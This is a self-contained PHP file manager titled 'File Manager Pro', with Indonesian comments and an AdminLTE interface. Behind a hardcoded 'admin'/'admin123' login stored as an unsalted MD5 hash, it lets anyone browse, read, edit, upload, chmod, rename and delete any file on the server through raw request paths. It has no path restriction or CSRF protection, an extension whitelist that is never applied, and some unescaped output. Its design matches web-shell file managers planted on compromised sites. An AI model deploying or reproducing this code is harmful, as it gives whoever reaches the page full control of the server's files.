<?php
session_start();
error_reporting(0);
set_time_limit(0);

// ============= KONFIGURASI =============
$USERNAME = 'admin';
$PASSWORD_HASH = 'e4db63edff21ac5738f6289d765d6a0f'; // admin123
$ALLOWED_EXTENSIONS = ['txt','php','html','css','js','json','xml','sql','md','log','htaccess','ini','yml','csv','py','java','c','cpp'];

// ============= FUNGSI UTILITY =============
function humanSize($bytes) {
    if ($bytes == 0) return '0 B';
    $units = ['B','KB','MB','GB','TB'];
    $p = floor(log($bytes,1024));
    return number_format($bytes/pow(1024,$p),2).' '.$units[$p];
}

function timeFmt($file) {
    return date("Y-m-d H:i:s", filemtime($file));
}

function getFileIcon($file) {
    if (is_dir($file)) return '<i class="fas fa-folder text-warning"></i>';
    $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
    $icons = [
        'php'=>'<i class="fab fa-php text-purple"></i>','html'=>'<i class="fab fa-html5 text-danger"></i>',
        'css'=>'<i class="fab fa-css3-alt text-info"></i>','js'=>'<i class="fab fa-js text-warning"></i>',
        'json'=>'<i class="fas fa-code text-success"></i>','txt'=>'<i class="fas fa-file-alt text-secondary"></i>',
        'pdf'=>'<i class="fas fa-file-pdf text-danger"></i>','zip'=>'<i class="fas fa-file-archive text-warning"></i>',
        'jpg'=>'<i class="fas fa-file-image text-primary"></i>','png'=>'<i class="fas fa-file-image text-primary"></i>',
        'sql'=>'<i class="fas fa-database text-info"></i>','py'=>'<i class="fab fa-python text-primary"></i>',
    ];
    return $icons[$ext] ?? '<i class="fas fa-file text-secondary"></i>';
}

function getPermissions($file) {
    $perms = fileperms($file);
    $info = '';
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? 'x' : '-');
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? 'x' : '-');
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? 'x' : '-');
    return $info;
}

// ============= LOGIN CHECK =============
if (!isset($_SESSION['logged_in'])) {
    if (isset($_POST['user'], $_POST['pass'])) {
        if ($_POST['user'] === $USERNAME && md5($_POST['pass']) === $PASSWORD_HASH) {
            $_SESSION['logged_in'] = true;
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
        }
        $login_error = 'Wrong Username or Password';
    }
    ?>
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Login - File Manager Pro</title>
      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/admin-lte@3.2/dist/css/adminlte.min.css">
      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css">
      <style>
        .login-page{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh}
        .card{border-radius:15px;box-shadow:0 10px 40px rgba(0,0,0,0.3);animation:slideIn 0.5s}
        @keyframes slideIn{from{opacity:0;transform:translateY(-30px)}to{opacity:1;transform:translateY(0)}}
        .login-logo b{color:#fff;font-size:2rem;text-shadow:2px 2px 4px rgba(0,0,0,0.3)}
        .btn-primary{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);border:none}
      </style>
    </head>
    <body class="hold-transition login-page">
    <div class="login-box">
      <div class="login-logo"><b><i class="fas fa-shield-alt"></i> File Manager Pro</b></div>
      <div class="card">
        <div class="card-body login-card-body">
          <p class="login-box-msg"><strong>Secure Login Panel</strong></p>
          <?php if(isset($login_error)): ?>
          <div class="alert alert-danger"><?= $login_error ?></div>
          <?php endif; ?>
          <form method="post">
            <div class="input-group mb-3">
              <input name="user" type="text" class="form-control" placeholder="Username" required>
              <div class="input-group-append"><div class="input-group-text"><i class="fas fa-user"></i></div></div>
            </div>
            <div class="input-group mb-3">
              <input name="pass" type="password" class="form-control" placeholder="Password" required>
              <div class="input-group-append"><div class="input-group-text"><i class="fas fa-lock"></i></div></div>
            </div>
            <button type="submit" class="btn btn-primary btn-block"><i class="fas fa-sign-in-alt"></i> Login</button>
          </form>
        </div>
      </div>
    </div>
    </body>
    </html>
    <?php exit;
}

// ============= PATH HANDLING =============
$dir = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
if (!$dir || !is_dir($dir)) $dir = getcwd();
$parent = dirname($dir);

// ============= ACTIONS =============
if (isset($_GET['logout'])) { session_destroy(); header('Location: '.$_SERVER['PHP_SELF']); exit; }

if (isset($_POST['create'])) {
    file_put_contents($dir.'/'.basename($_POST['new_file']),"");
    $_SESSION['msg'] = ['success','File created!'];
    header("Location: ?path=$dir"); exit;
}

if (isset($_POST['create_folder'])) {
    @mkdir($dir.'/'.basename($_POST['folder_name']),0755);
    $_SESSION['msg'] = ['success','Folder created!'];
    header("Location: ?path=$dir"); exit;
}

if (isset($_POST['upload'])) {
    if(move_uploaded_file($_FILES['upload_file']['tmp_name'],$dir.'/'.basename($_FILES['upload_file']['name'])))
        $_SESSION['msg'] = ['success','File uploaded!'];
    header("Location: ?path=$dir"); exit;
}

if (isset($_GET['delete'])) {
    $t = $_GET['delete'];
    is_file($t) ? unlink($t) : @rmdir($t);
    $_SESSION['msg'] = ['success','Deleted!'];
    header("Location: ?path=$dir"); exit;
}

if (isset($_POST['rename'])) {
    rename($_POST['old'], $dir.'/'.basename($_POST['new']));
    $_SESSION['msg'] = ['success','Renamed!'];
    header("Location: ?path=$dir"); exit;
}

if (isset($_POST['chmod'])) {
    chmod($_POST['file'], octdec($_POST['perms']));
    $_SESSION['msg'] = ['success','Permission changed!'];
    header("Location: ?path=$dir"); exit;
}

// ============= EDITOR =============
if (isset($_GET['edit'])) {
    $file = $_GET['edit'];
    $content = file_get_contents($file);
    
    if (isset($_POST['save'])) {
        file_put_contents($file, $_POST['content']);
        $_SESSION['msg'] = ['success','File saved!'];
        header("Location: ?path=$dir"); exit;
    }
    
    $filename = basename($file);
    $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
    $modes = ['php'=>'application/x-httpd-php','js'=>'javascript','json'=>'application/json','css'=>'css','html'=>'htmlmixed','xml'=>'xml','sql'=>'sql','md'=>'markdown','py'=>'python'];
    $mode = $modes[$ext] ?? 'text/plain';
    ?>
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="UTF-8">
      <title>Edit: <?= $filename ?></title>
      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/admin-lte@3.2/dist/css/adminlte.min.css">
      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css">
      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/codemirror.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/theme/material-darker.min.css">

<style>
body {
    background: #1e1e1e;
    color: #ccc;
}

.CodeMirror {
    height: 85vh !important;
    background: #1e1e1e;
    color: #eee;
    font-size: 15px;
    border: 1px solid #333 !important;
    font-family: "Fira Code", Consolas, monospace;
}

.vscode-panel {
    background: #1e1e1e;
    border: 1px solid #333;
    border-radius: 4px;
}

.editor-wrapper {
    padding: 0;
}

.vscode-footer {
    background: #252526;
    border-top: 1px solid #333;
    padding: 8px 12px;
    display: flex;
    justify-content: flex-end;
    gap: 10px;
}
</style>

    </head>
    <body>
    <nav class="navbar navbar-light bg-light">
      <a href="?path=<?= urlencode($dir) ?>" class="btn btn-sm btn-secondary"><i class="fas fa-arrow-left"></i> Back</a>
      <span class="navbar-text"><i class="fas fa-file"></i> <?= $filename ?></span>
    </nav>
<div class="container-fluid mt-3">

  <form method="POST">
    
    <div class="vscode-panel">

      <div class="editor-wrapper">
        <textarea name="content" id="editor" style="width:100%;height:95vh;"><?= htmlspecialchars($content) ?></textarea>
      </div>

      <div class="vscode-footer">
        <button name="save" class="btn btn-success btn-sm">
          <i class="fas fa-save"></i> Save (Ctrl+S)
        </button>

        <a href="?path=<?= urlencode($dir) ?>" class="btn btn-secondary btn-sm">
          Cancel
        </a>
      </div>
<style>.vscode-panel {
    background: #1e1e1e;
    border: 1px solid #333;
    border-radius: 4px;
}

.editor-wrapper {
    padding: 0;
}

.vscode-footer {
    background: #252526;
    border-top: 1px solid #333;
    padding: 8px 12px;
    display: flex;
    gap: 10px;
    justify-content: flex-end;
}
</style>
    </div>

  </form>

</div>

    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.4/dist/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/codemirror.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/xml/xml.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/javascript/javascript.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/css/css.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/htmlmixed/htmlmixed.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/clike/clike.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/php/php.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/sql/sql.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/python/python.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/markdown/markdown.min.js"></script>
    <script>
    var editor = CodeMirror.fromTextArea(document.getElementById("editor"),{
      lineNumbers:true,mode:"<?=$mode?>",theme:"dracula",lineWrapping:true,indentUnit:4,tabSize:4,
      extraKeys:{"Ctrl-S":function(){$('form').submit();return false;},"Cmd-S":function(){$('form').submit();return false;}}
    });
    </script>
    </body>
    </html>
    <?php exit;
}

// ============= DOWNLOAD =============
if (isset($_GET['download'])) {
    $file = $_GET['download'];
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    readfile($file);
    exit;
}

// ============= FILE LIST =============
$files = scandir($dir);
$folders = $regularFiles = [];
foreach ($files as $fi) {
    if ($fi == '.' || $fi == '..') continue;
    $path = $dir.'/'.$fi;
    is_dir($path) ? $folders[] = $fi : $regularFiles[] = $fi;
}
sort($folders); sort($regularFiles);
$files = array_merge($folders, $regularFiles);

$sys_info = [
    'os' => PHP_OS,
    'php' => PHP_VERSION,
    'user' => get_current_user(),
    'disk_free' => humanSize(@disk_free_space($dir)),
    'disk_total' => humanSize(@disk_total_space($dir))
];
?>
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>File Manager Pro</title>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/admin-lte@3.2/dist/css/adminlte.min.css">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/datatables.net-bs4/css/dataTables.bootstrap4.min.css">
  <style>
    .content-wrapper{min-height:calc(100vh - 57px)}
    .breadcrumb{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#fff;padding:15px;border-radius:10px;margin-bottom:20px}
    .breadcrumb-item a{color:#fff}.breadcrumb-item.active{color:#f0f0f0}
    .action-btns .btn{padding:3px 8px;font-size:12px;margin:2px}
    .file-row:hover{background:#f8f9fa}
    .stat-card{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#fff;padding:20px;border-radius:10px}
  </style>
</head>
<body class="hold-transition sidebar-mini">
<div class="wrapper">
  <nav class="main-header navbar navbar-expand navbar-white navbar-light">
    <ul class="navbar-nav">
      <li class="nav-item"><a class="nav-link" data-widget="pushmenu" href="#"><i class="fas fa-bars"></i></a></li>
      <a href="?path=<?= urlencode(getcwd()) ?>" class="nav-link">
    </ul>
    <ul class="navbar-nav ml-auto">
      <li class="nav-item"><span class="nav-link"><i class="fas fa-user"></i> <?=$sys_info['user']?></span></li>
      <li class="nav-item"><a class="nav-link" href="?logout=1"><i class="fas fa-sign-out-alt"></i> Logout</a></li>
    </ul>
  </nav>

  <aside class="main-sidebar sidebar-dark-primary elevation-4">
    <a href="?path=<?=getcwd()?>" class="brand-link">
      <i class="fas fa-shield-alt"></i>
      <span class="brand-text">File Manager Pro</span>
    </a>
    <div class="sidebar">
      <nav class="mt-2">
        <ul class="nav nav-pills nav-sidebar flex-column">
          <li class="nav-header">SYSTEM INFO</li>
          <li class="nav-item"><a class="nav-link"><i class="fas fa-server"></i><p><?=$sys_info['os']?></p></a></li>
          <li class="nav-item"><a class="nav-link"><i class="fab fa-php"></i><p>PHP <?=$sys_info['php']?></p></a></li>
          <li class="nav-header">STORAGE</li>
          <li class="nav-item"><a class="nav-link"><i class="fas fa-hdd"></i><p>Free: <?=$sys_info['disk_free']?></p></a></li>
          <li class="nav-item"><a class="nav-link"><i class="fas fa-database"></i><p>Total: <?=$sys_info['disk_total']?></p></a></li>
        </ul>
      </nav>
    </div>
  </aside>

  <div class="content-wrapper">
    <section class="content">
      <div class="container-fluid mt-3">
        
        <?php if(isset($_SESSION['msg'])): ?>
        <div class="alert alert-<?=$_SESSION['msg'][0]?> alert-dismissible">
          <button class="close" data-dismiss="alert">&times;</button>
          <?=$_SESSION['msg'][1]?>
        </div>
        <?php unset($_SESSION['msg']); endif; ?>

        <div class="row mb-3">
          <div class="col-md-3"><div class="small-box bg-info"><div class="inner"><h3><?=count($files)?></h3><p>Total Items</p></div><div class="icon"><i class="fas fa-folder"></i></div></div></div>
          <div class="col-md-3"><div class="small-box bg-success"><div class="inner"><h3><?=count($folders)?></h3><p>Folders</p></div><div class="icon"><i class="fas fa-folder-open"></i></div></div></div>
          <div class="col-md-3"><div class="small-box bg-warning"><div class="inner"><h3><?=count($regularFiles)?></h3><p>Files</p></div><div class="icon"><i class="fas fa-file"></i></div></div></div>
          <div class="col-md-3"><div class="small-box bg-danger"><div class="inner"><h3><?=$sys_info['disk_free']?></h3><p>Free Space</p></div><div class="icon"><i class="fas fa-hdd"></i></div></div></div>
        </div>

        <nav>
          <ol class="breadcrumb">
            <?php
            $crumbs = explode('/',trim(str_replace('\\','/',$dir),'/'));
            $dp = (substr(PHP_OS,0,3)==='WIN')?'':'/';
            foreach($crumbs as $k=>$v){
                if($v==='')continue;
                $dp.=$v.'/';
                echo $k<count($crumbs)-1?"<li class='breadcrumb-item'><a href='?path=$dp'>$v</a></li>":"<li class='breadcrumb-item active'>$v</li>";
            }
            ?>
          </ol>
        </nav>

        <div class="row mb-3">
          <div class="col-md-2 col-6"><button class="btn btn-success btn-block" data-toggle="modal" data-target="#uploadModal"><i class="fas fa-upload"></i> Upload</button></div>
          <div class="col-md-2 col-6"><button class="btn btn-primary btn-block" data-toggle="modal" data-target="#createFileModal"><i class="fas fa-file"></i> New File</button></div>
          <div class="col-md-2 col-6"><button class="btn btn-info btn-block" data-toggle="modal" data-target="#createFolderModal"><i class="fas fa-folder"></i> New Folder</button></div>
          <?php if($dir!="/"&&$parent!=$dir):?><div class="col-md-2 col-6"><a href="?path=<?=$parent?>" class="btn btn-secondary btn-block"><i class="fas fa-arrow-left"></i> Back</a></div><?php endif;?>
        </div>

        <div class="card">
          <div class="card-header bg-primary"><h3 class="card-title"><i class="fas fa-list"></i> Files & Folders</h3></div>
          <div class="card-body table-responsive p-0">
            <table id="fileTable" class="table table-hover">
              <thead><tr><th>Name</th><th>Size</th><th>Permission</th><th>Modified</th><th>Actions</th></tr></thead>
              <tbody>
              <?php foreach($files as $fi):
                $path=$dir.'/'.$fi;
                $isDir=is_dir($path);
                $size=$isDir?'-':humanSize(filesize($path));
                $perms=getPermissions($path);
                $time=timeFmt($path);
                $icon=getFileIcon($path);
              ?>
                <tr class="file-row">
                  <td><?=$icon?> <?php if($isDir):?><a href="?path=<?=urlencode($path)?>"><strong><?=htmlspecialchars($fi)?></strong></a><?php else:?><?=htmlspecialchars($fi)?><?php endif;?></td>
                  <td><?=$size?></td>
                  <td><code><?=$perms?></code></td>
                  <td><small><?=$time?></small></td>
                  <td class="action-btns">
                    <?php if(!$isDir):?>
                    <a href="?edit=<?=urlencode($path)?>" class="btn btn-sm btn-warning" title="Edit"><i class="fas fa-edit"></i></a>
                    <a href="?download=<?=urlencode($path)?>" class="btn btn-sm btn-success" title="Download"><i class="fas fa-download"></i></a>
                    <?php endif;?>
                    <button class="btn btn-sm btn-info" onclick="rename('<?=addslashes($path)?>','<?=addslashes($fi)?>')"><i class="fas fa-i-cursor"></i></button>
                    <button class="btn btn-sm btn-secondary" onclick="chmod('<?=addslashes($path)?>','<?=substr(sprintf('%o',fileperms($path)),-4)?>')"><i class="fas fa-lock"></i></button>
                    <a href="?delete=<?=urlencode($path)?>" class="btn btn-sm btn-danger" onclick="return confirm('Delete?')"><i class="fas fa-trash"></i></a>
                  </td>
                </tr>
              <?php endforeach;?>
              </tbody>
            </table>
          </div>
        </div>

      </div>
    </section>
  </div>
</div>

<!-- Modals -->
<div class="modal fade" id="uploadModal">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-header bg-success"><h4 class="modal-title">Upload File</h4><button class="close" data-dismiss="modal">&times;</button></div>
      <form method="POST" enctype="multipart/form-data">
        <div class="modal-body">
          <div class="custom-file">
            <input type="file" class="custom-file-input" name="upload_file" required>
            <label class="custom-file-label">Choose file</label>
          </div>
        </div>
        <div class="modal-footer">
          <button type="submit" name="upload" class="btn btn-success">Upload</button>
        </div>
      </form>
    </div>
  </div>
</div>

<div class="modal fade" id="createFileModal">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-header bg-primary"><h4 class="modal-title">Create File</h4><button class="close" data-dismiss="modal">&times;</button></div>
      <form method="POST">
        <div class="modal-body">
          <input type="text" name="new_file" class="form-control" placeholder="filename.ext" required>
        </div>
        <div class="modal-footer">
          <button type="submit" name="create" class="btn btn-primary">Create</button>
        </div>
      </form>
    </div>
  </div>
</div>

<div class="modal fade" id="createFolderModal">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-header bg-info"><h4 class="modal-title">Create Folder</h4><button class="close" data-dismiss="modal">&times;</button></div>
      <form method="POST">
        <div class="modal-body">
          <input type="text" name="folder_name" class="form-control" placeholder="folder-name" required>
        </div>
        <div class="modal-footer">
          <button type="submit" name="create_folder" class="btn btn-info">Create</button>
        </div>
      </form>
    </div>
  </div>
</div>

<div class="modal fade" id="renameModal">
  <div class="modal-dialog">
    <div class="modal-content">
      <form method="POST">
        <div class="modal-header"><h4>Rename</h4><button class="close" data-dismiss="modal">&times;</button></div>
        <div class="modal-body">
          <input type="hidden" name="old" id="renameOld">
          <input type="text" name="new" id="renameNew" class="form-control" required>
        </div>
        <div class="modal-footer">
          <button type="submit" name="rename" class="btn btn-primary">Save</button>
        </div>
      </form>
    </div>
  </div>
</div>

<div class="modal fade" id="chmodModal">
  <div class="modal-dialog">
    <div class="modal-content">
      <form method="POST">
        <div class="modal-header"><h4>Change Permission</h4><button class="close" data-dismiss="modal">&times;</button></div>
        <div class="modal-body">
          <input type="hidden" name="file" id="chmodFile">
          <input type="text" name="perms" id="chmodPerms" class="form-control" placeholder="0755" required>
        </div>
        <div class="modal-footer">
          <button type="submit" name="chmod" class="btn btn-secondary">Save</button>
        </div>
      </form>
    </div>
  </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/jquery@3.6.4/dist/jquery.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/admin-lte@3.2/dist/js/adminlte.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/datatables.net@1.13.1/js/jquery.dataTables.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/datatables.net-bs4@1.13.1/js/dataTables.bootstrap4.min.js"></script>
<script>
$(function(){
  $('#fileTable').DataTable({pageLength:25,language:{search:"Search:",lengthMenu:"Show _MENU_ per page"}});
  $('.custom-file-input').change(function(){$(this).next('.custom-file-label').html($(this).val().split('\\').pop())});
  setTimeout(function(){$('.alert').fadeOut()},3000);
});
function rename(old,name){$('#renameOld').val(old);$('#renameNew').val(name);$('#renameModal').modal('show')}
function chmod(file,perms){$('#chmodFile').val(file);$('#chmodPerms').val(perms);$('#chmodModal').modal('show')}
</script>
</body>
</html>